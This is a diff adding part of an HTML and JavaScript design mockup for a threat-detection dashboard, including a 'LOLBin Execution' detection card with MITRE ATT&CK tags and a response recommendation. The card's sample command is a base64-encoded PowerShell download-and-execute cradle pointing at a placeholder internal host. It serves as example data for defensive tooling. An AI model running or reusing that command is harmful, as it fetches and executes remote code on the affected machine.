+          <div class="cta-text">Get AI-powered threat analysis</div>
+          <button class="cta-btn">Analyze with BRIQA <span style="margin-left:2px;">&#8594;</span></button>
+        </div>
+      </div>
+
+      <!-- ═══ DETECTION CARD TAB ═══ -->
+      <div class="tab-content" id="tab-detail">
+        <div class="detail-header">
+          <span class="badge badge-critical">Critical</span>
+          <span class="detail-type">LOLBin Execution</span>
+        </div>
+
+        <div class="detail-desc">powershell.exe executed with encoded commands via suspicious parent process</div>
+
+        <div class="detail-divider"></div>
+
+        <div class="section-title">Technical Detail</div>
+
+        <div class="detail-sub-grid">
+          <div class="detail-card">
+            <div class="detail-card-label">Process Tree</div>
+            <div class="process-tree">
+              <span class="process-node">cmd.exe</span>
+              <span class="process-arrow">
+                <svg viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd"/></svg>
+              </span>
+              <span class="process-node" style="color: var(--critical);">powershell.exe</span>
+            </div>
+          </div>
+          <div class="detail-card">
+            <div class="detail-card-label">Process Info</div>
+            <div class="info-row">
+              <span class="info-key">PID</span>
+              <span class="info-val">4892</span>
+            </div>
+            <div class="info-row">
+              <span class="info-key">Parent PID</span>
+              <span class="info-val">3104</span>
+            </div>
+            <div class="info-row">
+              <span class="info-key">Path</span>
+              <span class="info-val">C:\Windows\System32\</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="section-title">Command Line</div>
+        <div class="code-block">
+          <code><span class="cmd-highlight">powershell.exe</span> <span class="cmd-flag">-EncodedCommand</span> SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA0ADIALwBwAGEAeQBsAG8AYQBkACcAKQA=</code>
+        </div>
+
+        <div class="tags-section">
+          <div class="section-title">MITRE ATT&CK</div>
+          <div class="tag-label">Tactics</div>
+          <div class="tags-row">
+            <span class="tag-pill tag-tactic">Execution</span>
+            <span class="tag-pill tag-tactic">Defense Evasion</span>
+          </div>
+          <div class="tag-label">Techniques</div>
+          <div class="tags-row">
+            <span class="tag-pill tag-technique">T1059.001 — PowerShell</span>
+            <span class="tag-pill tag-technique">T1027 — Obfuscated Files</span>
+          </div>
+        </div>
+
+        <div class="recommendation-card">
+          <div class="section-title">Recommendation</div>
+          <p class="recommendation-text">Immediately isolate the affected system and terminate the suspicious PowerShell process. Investigate the encoded command payload for potential C2 communication and lateral movement indicators.</p>
+        </div>
+
+        <div class="confidence-section">
+          <span class="confidence-label">Confidence</span>
+          <div class="confidence-bar-wrap">
+            <div class="confidence-bar" id="confidence-bar"></div>
+          </div>
+          <span class="confidence-pct" id="confidence-pct">0%</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="concept-label">Concept C &mdash; <span>Bento Grid + 3D Depth</span></div>
+</div>
+
+<script>
+  // Tab switching
+  const tabs = document.querySelectorAll('.tab');
+  const contents = document.querySelectorAll('.tab-content');
+
+  tabs.forEach(tab => {
+    tab.addEventListener('click', () => {
+      tabs.forEach(t => t.classList.remove('active'));
+      contents.forEach(c => c.classList.remove('active'));
+      tab.classList.add('active');
+      const target = document.getElementById('tab-' + tab.dataset.tab);
+      target.classList.add('active');
+
+      // Trigger animations when switching to results
+      if (tab.dataset.tab === 'results') {
+        triggerResultsAnimation();
+      }
+      // Trigger confidence bar animation on detail tab
+      if (tab.dataset.tab === 'detail') {
+        triggerConfidenceAnimation();
+      }
+    });
+  });
+
+  // Staggered animation for detection items
+  function triggerResultsAnimation() {
+    const items = document.querySelectorAll('.detection-item');
+    items.forEach(item => {
+      item.style.animation = 'none';
+      // Force reflow
+      void item.offsetHeight;
+      item.style.animation = '';
+    });
+  }
+
+  // Confidence bar animation
+  function triggerConfidenceAnimation() {
+    const bar = document.getElementById('confidence-bar');
+    const pct = document.getElementById('confidence-pct');
+    bar.style.width = '0%';
+    pct.textContent = '0%';
+
+    setTimeout(() => {
+      bar.style.width = '92%';
+      // Animate counter
+      let current = 0;
+      const target = 92;
+      const step = Math.ceil(target / 40);
+      const interval = setInterval(() => {
+        current += step;
+        if (current >= target) {
+          current = target;
+          clearInterval(interval);
+        }
+        pct.textContent = current + '%';
+      }, 25);
+    }, 200);
+  }
+
+  // Click on detection items to go to detail tab
+  document.querySelectorAll('.detection-item').forEach((item, idx) => {
+    item.addEventListener('click', () => {
+      tabs.forEach(t => t.classList.remove('active'));
+      contents.forEach(c => c.classList.remove('active'));
+      tabs[2].classList.add('active');
+      document.getElementById('tab-detail').classList.add('active');
+      triggerConfidenceAnimation();
+    });
+  });
+</script>
+</body>
+</html>
